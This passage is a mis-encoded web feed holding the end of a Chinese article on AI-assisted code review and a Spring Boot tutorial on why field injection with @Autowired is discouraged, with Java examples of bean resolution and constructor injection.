<p>2.<strong>æ„å»ºå…¨åŸŸä¸šåŠ¡çŸ¥è¯†åº“</strong>ï¼šè‡ªåŠ¨æŠ“å–å¹¶èåˆäº§å“ç»ç†çš„å†å²PRDã€è®¾è®¡æ–‡æ¡£ç­‰éæŠ€æœ¯çŸ¥è¯†ï¼Œå°†å…¶è½¬åŒ–ä¸ºçŸ¥è¯†å·¥ç¨‹ä¸­çš„å…³é”®ä¸Šä¸‹æ–‡ã€‚è¿™ä½¿å¾—AIåœ¨è¯„å®¡æ—¶ï¼Œä¸ä»…èƒ½ç†è§£â€œä»£ç æ€ä¹ˆå†™â€ï¼Œæ›´èƒ½åˆ¤æ–­â€œä»£ç ä¸ºä½•è€Œå†™â€ï¼Œå®ç°å¯¹ä¸šåŠ¡æ„å›¾çš„ç²¾å‡†æ ¡éªŒï¼Œä»æºå¤´è§„é¿åç¦»äº§å“è®¾è®¡çš„å®ç°ã€‚</p>
<p>3.<strong>å®ç°éœ€æ±‚ä¸Šä¸‹æ–‡çš„è‡ªåŠ¨å…³è”</strong>ï¼šé€šè¿‡è§„èŒƒç ”å‘æµç¨‹ï¼Œçº¦æŸåœ¨æäº¤ä»£ç æ—¶äºcommitä¿¡æ¯ä¸­åµŒå…¥éœ€æ±‚ç¼–å·ã€‚ç³»ç»Ÿåœ¨è¯„å®¡æ—¶è‡ªåŠ¨æå–è¯¥ç¼–å·ï¼Œå¹¶ä¸»åŠ¨è·å–å¯¹åº”çš„PRDè¯¦æƒ…ã€‚è¿™ä½¿å¾—æ¯ä¸€æ¬¡ä»£ç è¯„å®¡éƒ½èƒ½å¤Ÿåœ¨å®Œæ•´çš„ä¸šåŠ¡èƒŒæ™¯ä¸­è¿›è¡Œï¼ŒAIèƒ½å¤Ÿç›´æ¥å¯¹ç…§éœ€æ±‚æ–‡æ¡£ï¼Œåˆ¤æ–­ä»£ç å®ç°æ˜¯å¦å®Œæ•´ã€å‡†ç¡®åœ°æ»¡è¶³äº†æ‰€æœ‰åŠŸèƒ½ç‚¹ä¸ä¸šåŠ¡è§„åˆ™ï¼Œæä¾›å‰æ›´åŠ ç²¾å‡†çš„ä¸Šä¸‹æ–‡ã€‚</p>
<p>è™½ç„¶æ¢ç´¢çš„é“è·¯å¹¶éå¦é€”ï¼Œæˆ‘ä»¬æ›¾åœ¨å…·ä½“çš„æŠ€æœ¯ç»†èŠ‚ä¸­é™·å…¥å›°å¢ƒï¼Œä¾‹å¦‚ï¼Œä¸ºäº†åœ¨ CentOS 7.9 çš„ç¯å¢ƒä¸­æ”¯æŒé«˜ç‰ˆæœ¬ ONNX è¿è¡Œæ—¶ä»¥å¯ç”¨é‡æ’åºåŠŸèƒ½ï¼Œä¸å¾—ä¸æ‰‹åŠ¨ç¼–å†™dockerè„šæœ¬ä»æºç ç¼–è¯‘é«˜ç‰ˆæœ¬çš„cglibä¾èµ–ã€‚è¿™æ®µç»å†ï¼Œæ°æ°å°è¯äº†å¼—é›·å¾·é‡Œå…‹Â·å¸ƒé²å…‹æ–¯åœ¨ã€Šäººæœˆç¥è¯ã€‹ä¸­æ‰€æ­ç¤ºçš„é‚£å¥ç®´è¨€ï¼š</p>
<blockquote>
<p>The only way to accelerate software work is to simplify the product and the process, and to face the essential complexity of the software task itself with courage and skill.</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot ä¸ºä½•ä¸æ¨èä½¿ç”¨@Autowired]]></title>    <link>https://juejin.cn/post/7597622924272123931</link>    <guid>https://juejin.cn/post/7597622924272123931</guid>    <pubDate>2026-01-21T09:35:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597622924272123931" data-draft-id="7597622924272107547" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot ä¸ºä½•ä¸æ¨èä½¿ç”¨@Autowired"/> <meta itemprop="keywords" content="Spring Boot"/> <meta itemprop="datePublished" content="2026-01-21T09:35:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é—²ç…®å…‰é˜´"/> <meta itemprop="url" content="https://juejin.cn/user/1523239911963420"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot ä¸ºä½•ä¸æ¨èä½¿ç”¨@Autowired
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1523239911963420/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é—²ç…®å…‰é˜´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:35:19.000Z" title="Wed Jan 21 2026 09:35:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€ä¸ºä»€ä¹ˆä¸å»ºè®®ä½¿ç”¨@Autowired</h2>
<p>åœ¨Springå¼€å‘ä¸­ï¼Œ@Autowiredæ³¨è§£è™½èƒ½å®ç°ä¾èµ–æ³¨å…¥ï¼Œä½†å—å…¶è®¾è®¡ç‰¹æ€§å½±å“ï¼Œå­˜åœ¨å¯è¯»æ€§ã€å¯¹è±¡å®Œæ•´æ€§åŠæ­§ä¹‰æ³¨å…¥ç­‰é—®é¢˜ï¼Œé€æ¸ä¸å†è¢«æ¨èç”¨äºå®é™…å¼€å‘ã€‚æ ¸å¿ƒåŸå› å¯å½’çº³ä¸ºä»¥ä¸‹ä¸‰ç‚¹ï¼š</p>
<h3 data-id="heading-1">é™ä½ä»£ç å¯è¯»æ€§ä¸æ˜ç¡®æ€§</h3>
<p>@Autowiredå±äºâ€œ<strong>éšå¼æ³¨å…¥</strong>â€ï¼Œä¾èµ–Springè‡ªåŠ¨è£…é…æœºåˆ¶å®ŒæˆBeanæ³¨å…¥ï¼Œå¼€å‘è€…<strong>æ— æ³•ç›´è§‚åˆ¤æ–­æ³¨å…¥Beançš„æ¥æº</strong>ã€æ‰«æèŒƒå›´åŠè£…é…é€»è¾‘ã€‚ç›¸è¾ƒäºæ˜¾å¼æ³¨å…¥ï¼Œé˜…è¯»ä»£ç æ—¶éœ€é¢å¤–è¿½æº¯Beançš„å®šä¹‰ä½ç½®ä¸åŒ¹é…è§„åˆ™ï¼Œå¢åŠ ç†è§£æˆæœ¬ã€‚</p>
<h3 data-id="heading-2">Beanåˆå§‹åŒ–é˜¶æ®µä½¿ç”¨çš„æ˜¯ä¸å®Œæ•´çš„å¯¹è±¡</h3>
<p>è¿™æ˜¯@Autowired æ˜“è¢«å¿½è§†çš„æ ¸å¿ƒé—®é¢˜ã€‚Springåˆå§‹åŒ–Beanæ—¶ï¼Œè‹¥é€š@Autowiredæ³¨å…¥ä¾èµ–ï¼Œä¸”åŒæ—¶åœ¨åˆå§‹åŒ–é˜¶æ®µï¼ˆå¦‚æ‰§è¡Œ@PostConstruct æ–¹æ³•ï¼‰å†…è°ƒç”¨äº†Beançš„ä¸šåŠ¡æ–¹æ³•ï¼Œä½†æ­¤æ—¶ä¾èµ–çš„Beanå°šæœªå®Œå…¨åˆå§‹åŒ–å®Œæˆï¼Œå³ä½¿ç”¨â€œ<strong>ä¸å®Œæ•´å¯¹è±¡</strong>â€æ‰§è¡Œæ“ä½œï¼Œå¼•å‘ä¸å¯é¢„æœŸçš„å¼‚å¸¸ã€‚<strong>è¿™ç§æƒ…å†µå¸¸å‘ç”Ÿåœ¨å¾ªç¯ä¾èµ–çš„æƒ…æ™¯ä¸‹</strong></p>
<h3 data-id="heading-3">å¤šBeanåŒ¹é…æ—¶å­˜åœ¨æ­§ä¹‰é£é™©</h3>
<p>å½“å®¹å™¨ä¸­å­˜åœ¨å¤šä¸ªåŒç±»å‹Beanæ—¶ï¼Œ@Autowiredéœ€ä¾èµ–@Primaryæ³¨è§£ã€å˜é‡ååŒ¹é…ç­‰é¢å¤–è§„åˆ™ç­›é€‰æœ€ä¼˜è§£ï¼Œè‹¥è§„åˆ™è®¾ç½®ä¸å½“ã€åæœŸBeanå®šä¹‰è¢«ä¿®æ”¹ï¼Œæˆ–å›¢é˜Ÿæˆå‘˜ä¸ç†Ÿæ‚‰ç­›é€‰ä¼˜å…ˆçº§ï¼Œææ˜“å‡ºç°æ­§ä¹‰æ³¨å…¥é—®é¢˜ã€‚è¿™ç§é—®é¢˜æ— æ³•åœ¨ç¼–è¯‘æœŸå¯Ÿè§‰ï¼Œä»…åœ¨è¿è¡Œæ—¶æŠ›å‡ºNoUniqueBeanDefinitionExceptionï¼Œæ’æŸ¥éš¾åº¦å¤§ï¼Œä¸”å¯èƒ½å› æ³¨å…¥é”™è¯¯Beanå¯¼è‡´ä¸šåŠ¡é€»è¾‘å¼‚å¸¸ï¼Œå½±å“ç³»ç»Ÿå¯é æ€§ä¸ç¨³å®šæ€§ã€‚</p>
<h2 data-id="heading-4">äºŒã€@Autowired æŸ¥æ‰¾Beançš„å®Œæ•´è§„åˆ™</h2>
<p>@Autowiredçš„æ ¸å¿ƒé€»è¾‘æ˜¯â€œ<strong>å…ˆæŒ‰ç±»å‹åŒ¹é…ï¼Œå†æŒ‰ä¼˜å…ˆçº§ç­›é€‰</strong>â€ï¼Œå…¶å®Œæ•´çš„BeanæŸ¥æ‰¾ä¸æ³¨å…¥æµç¨‹å¦‚ä¸‹</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A["å¼€å§‹ï¼šSpringå°è¯•æ³¨å…¥Bean"] --&gt; B{"å€™é€‰Beanæ•°é‡ &gt; 1ï¼Ÿ"}
    B -- å¦ --&gt; C["ç›´æ¥æ³¨å…¥è¯¥å”¯ä¸€Bean"] --&gt; D["æ³¨å…¥å®Œæˆ"]
    B -- æ˜¯ --&gt; E{"æ£€æŸ¥æ˜¯å¦æœ‰@Primaryæ³¨è§£çš„Beanï¼Ÿ"}
    %% å¤šBeanåœºæ™¯çš„ä¼˜å…ˆçº§ç­›é€‰é€»è¾‘
    E -- æœ‰ --&gt; F["é€‰æ‹©æ ‡æ³¨@Primaryçš„Beanæ³¨å…¥&lt;br/&gt;ï¼ˆé€‚ç”¨äºæ˜ç¡®é»˜è®¤å®ç°çš„åœºæ™¯ï¼‰"] --&gt; D
    E -- æ—  --&gt; G{"æ£€æŸ¥å˜é‡åä¸Beanåç§°æ˜¯å¦åŒ¹é…ï¼Ÿ&lt;br/&gt;ï¼ˆä»…å­—æ®µ/setteræ³¨å…¥ç”Ÿæ•ˆï¼‰"}
    G -- åŒ¹é… --&gt; H["é€‰æ‹©åç§°åŒ¹é…çš„Beanæ³¨å…¥&lt;br/&gt;ï¼ˆBeanåé»˜è®¤ç±»åé¦–å­—æ¯å°å†™ï¼Œå¯è‡ªå®šä¹‰ï¼‰"] --&gt; D
    G -- ä¸åŒ¹é… --&gt; I{"æ£€æŸ¥æ˜¯å¦ä»…å­˜åœ¨ä¸€ä¸ªæ³›å‹åŒ¹é…çš„Beanï¼Ÿ"}
    I -- æ˜¯ --&gt; J["é€‰æ‹©æ³›å‹åŒ¹é…çš„Beanæ³¨å…¥"] --&gt; D
    I -- å¦ --&gt; K["æŠ›å‡ºNoUniqueBeanDefinitionExceptionå¼‚å¸¸&lt;br/&gt;ï¼ˆæ— å”¯ä¸€åŒ¹é…çš„Beanï¼‰"] --&gt; D["ç»“æŸ"]
</code></pre>
<h4 data-id="heading-5">@Primaryæ³¨è§£</h4>
<p>è‹¥æŸä¸ªå€™é€‰Beançš„å®ç°ç±»ä¸Šæ·»åŠ äº†@Primaryæ³¨è§£ï¼ŒSpringä¼šä¼˜å…ˆé€‰æ‹©è¯¥Beanæ³¨å…¥ã€‚@Primaryæœ¬è´¨æ˜¯å‘Šè¯‰Springâ€œ<strong>å½“å­˜åœ¨å¤šä¸ªåŒç±»å‹Beanæ—¶ï¼Œä¼˜å…ˆä½¿ç”¨æˆ‘</strong>â€ï¼Œé€‚ç”¨äºæ˜ç¡®æŸä¸ªBeanä¸ºé»˜è®¤å®ç°çš„åœºæ™¯ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ¥å£å®šä¹‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> {}
<span class="hljs-comment">// ä¸¤ä¸ªå®ç°ç±»</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Primary</span> <span class="hljs-comment">// æ ‡è®°ä¸ºä¼˜å…ˆBean</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefaultUserService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {}
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OtherUserService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {}
<span class="hljs-comment">// æ³¨å…¥æ—¶ï¼Œä¼šä¼˜å…ˆæ³¨å…¥DefaultUserService</span>
<span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> UserService userService; <span class="hljs-comment">// å®é™…æ³¨å…¥DefaultUserService</span>
</code></pre>
<h4 data-id="heading-6">å˜é‡åä¸Beanåç§°åŒ¹é…</h4>
<p>è‹¥æœªæŒ‡å®š@Primaryï¼Œ<strong>Springä¼šå¯¹æ¯”è¢«æ³¨å…¥å˜é‡çš„åç§°ä¸å€™é€‰Beançš„åç§°</strong>ï¼ˆé»˜è®¤Beanåç§°ä¸ºç±»åé¦–å­—æ¯å°å†™ï¼‰ï¼Œè‹¥å­˜åœ¨å®Œå…¨åŒ¹é…çš„Beanï¼Œåˆ™æ³¨å…¥è¯¥Beanã€‚éœ€æ³¨æ„ï¼Œæ­¤è§„åˆ™ä»…é€‚ç”¨äºå­—æ®µæ³¨å…¥å’Œsetteræ–¹æ³•æ³¨å…¥ï¼Œæ„é€ å‡½æ•°æ³¨å…¥ä¸é€‚ç”¨è¯¥è§„åˆ™ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service("otherUserService")</span> <span class="hljs-comment">// è‡ªå®šä¹‰Beanåç§°ä¸ºotherUserService</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OtherUserService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {}
<span class="hljs-meta">@Service</span> <span class="hljs-comment">// é»˜è®¤Beanåç§°ä¸ºdefaultUserService</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefaultUserService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {}
<span class="hljs-comment">// å˜é‡åä¸OtherUserServiceçš„Beanåç§°ä¸€è‡´ï¼Œæ³¨å…¥OtherUserService</span>
<span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> UserService otherUserService;
</code></pre>
<h4 data-id="heading-7">æ³›å‹åŒ¹é…ç­›é€‰</h4>
<p>åœ¨æ³›å‹Beanåœºæ™¯ä¸­ï¼Œè‹¥å¤šä¸ªå€™é€‰Beançš„åŸå§‹ç±»å‹ç›¸åŒï¼Œä½†æ³›å‹å‚æ•°ä¸åŒï¼ŒSpringä¼šç­›é€‰å‡ºä¸ç›®æ ‡æ³¨å…¥ä½ç½®æ³›å‹å‚æ•°ä¸€è‡´çš„Beanã€‚è¿™ç§åœºæ™¯å¸¸è§äºé€šç”¨ç»„ä»¶å°è£…ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ³›å‹æ¥å£</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BaseDao</span>&lt;T&gt; {}
<span class="hljs-comment">// ä¸¤ä¸ªæ³›å‹å®ç°ç±»</span>
<span class="hljs-meta">@Repository</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDao</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BaseDao</span>&lt;User&gt; {}
<span class="hljs-meta">@Repository</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderDao</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BaseDao</span>&lt;Order&gt; {}
<span class="hljs-comment">// æ³¨å…¥æ—¶ï¼Œæ ¹æ®æ³›å‹å‚æ•°åŒ¹é…å¯¹åº”çš„Bean</span>
<span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> BaseDao&lt;User&gt; userDao; <span class="hljs-comment">// æ³¨å…¥UserDao</span>
<span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> BaseDao&lt;Order&gt; orderDao; <span class="hljs-comment">// æ³¨å…¥OrderDao</span>
</code></pre>
<p>è‹¥ä»…å­˜åœ¨ä¸€ä¸ªä¸ç›®æ ‡æ³›å‹åŒ¹é…çš„å®ç°ç±»ï¼Œæ— è®ºæ˜¯å¦æœ‰å…¶ä»–åŒåŸå§‹ç±»å‹Beanï¼Œéƒ½ä¼šä¼˜å…ˆæ³¨å…¥è¯¥æ³›å‹åŒ¹é…çš„Beanã€‚</p>
<h2 data-id="heading-8">ä¸‰ã€Spring Bootæ¨èçš„ä¾èµ–æ³¨å…¥æ–¹å¼</h2>
<p>é’ˆå¯¹ä¸Šè¿°@Autowiredçš„ä¸‰å¤§é—®é¢˜ï¼ŒSpring Bootå®˜æ–¹æ¨èä½¿ç”¨â€œ<strong>æ˜¾å¼æ³¨å…¥</strong>â€æ–¹å¼ï¼Œæ ¸å¿ƒåŸåˆ™æ˜¯â€œæ˜ç¡®ä¾èµ–ã€ä¿è¯å¯¹è±¡å®Œæ•´æ€§ã€è§„é¿æ­§ä¹‰é£é™©â€ï¼Œä¸»è¦åŒ…æ‹¬æ„é€ å‡½æ•°æ³¨å…¥ã€setteræ–¹æ³•æ³¨å…¥ï¼Œå…¶ä¸­æ„é€ å‡½æ•°æ³¨å…¥ä¸ºæœ€ä¼˜æ¨èã€‚</p>
<h3 data-id="heading-9">3.1 æ„é€ å‡½æ•°æ³¨å…¥ï¼ˆæ¨èé¦–é€‰ï¼‰</h3>
<p>æ„é€ å‡½æ•°æ³¨å…¥æ˜¯Spring Bootå®˜æ–¹æœ€æ¨èçš„æ³¨å…¥æ–¹å¼ï¼Œé€šè¿‡ç±»çš„æ„é€ å‡½æ•°å£°æ˜ä¾èµ–ï¼ŒSpringå®¹å™¨åœ¨åˆå§‹åŒ–Beanæ—¶ï¼Œä¼šé€šè¿‡æ„é€ å‡½æ•°ä¼ å…¥ä¾èµ–çš„Beanã€‚å…¶ä¼˜åŠ¿æä¸ºæ˜¾è‘—ï¼Œæ˜¯ç›®å‰ä¼ä¸šçº§å¼€å‘çš„ä¸»æµé€‰æ‹©ã€‚</p>
<h4 data-id="heading-10">3.1.1 ä¼˜åŠ¿å’Œé—®é¢˜</h4>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>æ˜¾å¼å£°æ˜ä¾èµ–</strong>ï¼š<strong>è§£å†³é—®é¢˜1</strong>ï¼Œä¾èµ–å…³ç³»åœ¨æ„é€ å‡½æ•°ä¸­æ˜ç¡®ä½“ç°ï¼Œå¼€å‘è€…å¯ç›´è§‚äº†è§£Beançš„ä¾èµ–é¡¹ï¼Œæå‡ä»£ç å¯è¯»æ€§å’Œç»´æŠ¤æ€§ã€‚</li>
<li><strong>å¼ºåˆ¶ä¾èµ–å®ä¾‹åŒ–</strong>ï¼š<strong>è§£å†³é—®é¢˜2</strong>ï¼Œå­˜åœ¨å¾ªç¯ä¾èµ–çš„beanï¼Œå¦‚æœéƒ½æ˜¯é€šè¿‡æ„é€ å‡½æ•°ä¾èµ–ï¼Œé‚£ä¹ˆå°†æ— æ³•å®ä¾‹åŒ–ï¼Œå°†åœ¨å¯åŠ¨æ—¶æŠ¥é”™ï¼Œä¸ä¼šå‡ºç°ä¸å®Œæ•´å¯¹è±¡è¢«è°ƒç”¨çš„é—®é¢˜</li>
<li><strong>æ”¯æŒä¸å¯å˜å¯¹è±¡</strong>ï¼šå¯å°†æ³¨å…¥çš„ä¾èµ–å£°æ˜ä¸ºfinalå˜é‡ï¼Œä¸€æ—¦åˆå§‹åŒ–å®Œæˆä¾¿æ— æ³•ä¿®æ”¹ï¼Œä¿è¯çº¿ç¨‹å®‰å…¨ã€‚</li>
<li><strong>ä½è€¦åˆï¼Œå¯æµ‹è¯•æ€§å¼º</strong>ï¼šè„±ç¦»Springå®¹å™¨æ—¶ï¼Œå¯ç›´æ¥é€šè¿‡æ„é€ å‡½æ•°ä¼ å…¥æ¨¡æ‹ŸBeanï¼ˆå¦‚Mockitoç”Ÿæˆçš„Mockå¯¹è±¡ï¼‰ï¼Œå•å…ƒæµ‹è¯•ç®€å•é«˜æ•ˆï¼Œä¸ä¾èµ–Spring Testä¸Šä¸‹æ–‡ã€‚</li>
</ul>
<p><strong>é—®é¢˜ï¼š</strong></p>
<ul>
<li><strong>ç¬¬ä¸‰ç‚¹é—®é¢˜ä¾ç„¶å­˜åœ¨</strong>ï¼Œå³å¤šBeanåŒ¹é…æ—¶å­˜åœ¨æ­§ä¹‰é£é™©</li>
</ul>
<h4 data-id="heading-11">3.1.2 ä»£ç ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> {
Â  Â  <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> UserDao userDao;
Â  Â  <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> OrderService orderService;
Â  Â  <span class="hljs-comment">// æ„é€ å‡½æ•°æ³¨å…¥ï¼ŒSpring 4.3+å¯çœç•¥@Autowiredæ³¨è§£</span>
Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserServiceImpl</span><span class="hljs-params">(UserDao userDao, OrderService orderService)</span> {
Â  Â  Â  Â  <span class="hljs-built_in">this</span>.userDao = userDao;
Â  Â  Â  Â  <span class="hljs-built_in">this</span>.orderService = orderService;
Â  Â  }
Â  Â  <span class="hljs-comment">// ä¸šåŠ¡æ–¹æ³•</span>
Â  Â  <span class="hljs-meta">@Override</span>
Â  Â  <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(Long id)</span> {
Â  Â  Â  Â  <span class="hljs-keyword">return</span> userDao.selectById(id);
Â  Â  }
}
</code></pre>
<p>æ³¨ï¼šSpring 4.3åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œå¯¹äºåªæœ‰ä¸€ä¸ªæ„é€ å‡½æ•°çš„Beanï¼Œå¯çœç•¥æ„é€ å‡½æ•°ä¸Šçš„@Autowiredæ³¨è§£ï¼ŒSpringä¼šè‡ªåŠ¨é€šè¿‡è¯¥æ„é€ å‡½æ•°æ³¨å…¥ä¾èµ–ï¼Œè¿›ä¸€æ­¥ç®€åŒ–ä»£ç ã€‚</p>
<h3 data-id="heading-12">3.2 Setteræ–¹æ³•æ³¨å…¥</h3>
